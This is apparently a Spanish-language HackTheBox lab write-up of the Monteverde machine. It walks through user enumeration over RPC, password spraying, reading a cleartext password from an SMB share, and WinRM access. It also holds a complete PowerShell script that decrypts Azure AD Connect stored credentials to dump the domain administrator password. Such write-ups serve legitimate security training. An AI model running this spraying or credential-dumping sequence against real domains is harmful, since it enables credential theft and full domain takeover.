---
tags:
title: Monteverde - Medium (HTB)
permalink: /Monteverde-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49693 10.10.10.172
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 14:35 -03
Nmap scan report for 10.10.10.172
Host is up (0.80s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-03 17:35:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-03T17:36:24
|_  start_date: N/A
|_clock-skew: -31s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.13 seconds
```

# Service enumeration

### Port 135 RPC

Una vez tenemos el escaneo de `nmap` vemos que hay varios puerto abierto, como el del protocolo `smb`, `rpc` y demas, voy a probar conectarme por `rpc` para ver si tenemos posibilidad de listar usuarios.

```bash
rpcclient -U "" -N 10.10.10.172  
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

Con exito me pude conectar y veo varios usarios. Los anoto en un archivo llamado `users`.
Anteriormente no tuve exito al tratar de realizar ataques como `Kerberoasting` o `ASREPRoasting` si proporcionar contraseñas debido a que no tenemos ninguna asi que lo que voy a probar es un `Password spraying` probando como contraseñas los mismos nombres de usuarios debido a que es una practica comun que los usuarios usen como password su mismo nombre de usuario, asi que para eso voy a usar `crackmapexec`.

```bash
crackmapexec smb 10.10.10.172 -u users -p users 
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
<SNIP>
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

Con exito descubri que la pass de `SABatchJobs` es su mismo nombre de usuario. Ahora voy a conectarme via `smbclient`para listar shares compartidos a nivel de red y si puedo recolectar datos que me sean de ayuda o me sean utiles.

```bash
impacket-smbclient MEGABANK.LOCAL/SABatchJobs:SABatchJobs@10.10.10.172 -dc-ip 10.10.10.172 -target-ip 10.10.10.172
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
azure_uploads
C$
E$
IPC$
NETLOGON
SYSVOL
users$
```

Veo que hay varios shares, pero algunos de ellos estan vacios o no me dejan verlos, pero el share `users$` si puedo asi que lo voy a enumerar.

```# ls
drw-rw-rw-          0  Fri Jan  3 10:12:48 2020 .
drw-rw-rw-          0  Fri Jan  3 10:12:48 2020 ..
drw-rw-rw-          0  Fri Jan  3 10:15:23 2020 dgalanos
drw-rw-rw-          0  Fri Jan  3 10:41:18 2020 mhope
drw-rw-rw-          0  Fri Jan  3 10:14:56 2020 roleary
drw-rw-rw-          0  Fri Jan  3 10:14:28 2020 smorgan
```

Veo directorios de varios usuarios. Pero solo en el directorio de `mhope` hay informacion. Parecido a los archivos exportados con credenciales de powershell, en este mismo caso veo un .`xml` con una contraseña que como esta en el directorio de `mhope` intuyo que es de el: `4n0therD4y@n0th3r$`

```bash
# cd dgalanos
# ls
drw-rw-rw-          0  Fri Jan  3 10:15:23 2020 .
drw-rw-rw-          0  Fri Jan  3 10:15:23 2020 ..
# cd ../mhope
# ld
*** Unknown syntax: ld
# ls
drw-rw-rw-          0  Fri Jan  3 10:41:18 2020 .
drw-rw-rw-          0  Fri Jan  3 10:41:18 2020 ..
-rw-rw-rw-       1212  Fri Jan  3 11:59:24 2020 azure.xml
# cat azure.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

Ahora que tengo credenciales las voy a probar para conectarme por `evil-winrm`.

```bash
evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'

<SNIP>
*Evil-WinRM* PS C:\Users\mhope\Documents>
```

Ya una vez dentro de la maquina veo que `mhope` pertenece al grupo de `Azure Admins`

```bash
net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User''s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   10/3/2025 11:18:54 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.
```

Y si enumero por bloodhound no me muestra una via para escalar privilegios hacia el usuario `Administrator` pero buscando en internet encuentro este [enlace](https://blog.xpnsec.com/azuread-connect-for-redteam/) que muestra un `PoC` de como abusar de este grupo para poder dumpear las credenciales del `Domain Admin` de la maquina, asi que solo sigo los comando a realizar para poder lograr el dump

{% raw %}
```powershell
*Evil-WinRM* PS C:\> $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=.;Initial Catalog=ADSync;trusted_connection=true;"
*Evil-WinRM* PS C:\> $client.Open()
*Evil-WinRM* PS C:\> $cmd = $client.CreateCommand()
*Evil-WinRM* PS C:\> $cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
*Evil-WinRM* PS C:\> $reader = $cmd.ExecuteReader()
*Evil-WinRM* PS C:\> $reader.Read() | Out-Null
*Evil-WinRM* PS C:\> $key_id = $reader.GetInt32(0)
*Evil-WinRM* PS C:\> $instance_id = $reader.GetGuid(1)
*Evil-WinRM* PS C:\> $entropy = $reader.GetGuid(2)
*Evil-WinRM* PS C:\> $reader.Close()
*Evil-WinRM* PS C:\> $cmd = $client.CreateCommand()
*Evil-WinRM* PS C:\> $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
*Evil-WinRM* PS C:\> $reader = $cmd.ExecuteReader()
*Evil-WinRM* PS C:\> $reader.Read() | Out-Null
*Evil-WinRM* PS C:\> $config = $reader.GetString(0)
*Evil-WinRM* PS C:\> $crypted = $reader.GetString(1)
*Evil-WinRM* PS C:\> $reader.Close()
*Evil-WinRM* PS C:\> add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll’
*Evil-WinRM* PS C:\> $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
*Evil-WinRM* PS C:\> $km.LoadKeySet($entropy, $instance_id, $key_id)
*Evil-WinRM* PS C:\> $key = $null
*Evil-WinRM* PS C:\> $km.GetActiveCredentialKey([ref]$key)
*Evil-WinRM* PS C:\> $key2 = $null
*Evil-WinRM* PS C:\> $km.GetKey(1, [ref]$key2)
*Evil-WinRM* PS C:\> $decrypted = $null
*Evil-WinRM* PS C:\> $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
*Evil-WinRM* PS C:\> $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
*Evil-WinRM* PS C:\> $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
*Evil-WinRM* PS C:\> $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
*Evil-WinRM* PS C:\> Write-Host ("Domain: " + $domain.Domain)
Domain: MEGABANK.LOCAL
*Evil-WinRM* PS C:\> Write-Host ("Username: " + $username.Username)
Username: administrator
*Evil-WinRM* PS C:\> Write-Host ("Password: " + $password.Password)
Password: d0m@in4dminyeah!
```
{% endraw %}

Veo que finalmente logre dumpear la contraseña del usuario `Administrator`
```bash
crackmapexec smb 10.10.10.172 -u Administrator -p 'd0m@in4dminyeah!'
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Administrator:d0m@in4dminyeah! (Pwn3d!) 
```

`~Happy Hacking.`
